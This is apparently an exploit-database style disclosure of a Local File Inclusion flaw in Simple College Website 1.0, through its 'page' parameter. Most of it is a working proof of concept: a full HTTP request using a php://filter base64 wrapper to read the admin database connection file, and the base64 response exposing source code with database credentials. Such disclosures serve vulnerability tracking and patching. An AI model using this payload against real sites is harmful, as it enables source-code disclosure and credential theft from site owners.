# Simple College Website 1.0 - 'page' Local File Inclusion

# Vendor Homepage: c
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/simple-college-website.zip
# Version: 1.0


## Vulnerability Type :
Local File Inclusion


## Vulnerability Version :
1.0


## Recurring environment:
* Windows 10
* PHP 5.4.5
* Apache 2.4.23


## Vulnerability Description AND recurrence:

```
#Request
 
GET /college_website/index.php?page=php://filter/convert.base64-encode/resource=admin/db_connect HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=7ls9j695lglc2eah5khecv2g66
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```
 
#Response 
``` 
 <main class="">
 
        PD9waHAgDQoNCiRjb25uPSBuZXcgbXlzcWxpKCdsb2NhbGhvc3QnLCdyb290JywncGFzc3dvcmQnLCdjb2xsZWdlX3dlYnNpdGVfZGInKW9yIGRpZSgiQ291bGQgbm90IGNvbm5lY3QgdG8gbXlzcWwiLm15c3FsaV9lcnJvcigkY29uKSk7DQo=       
 
</main>
```
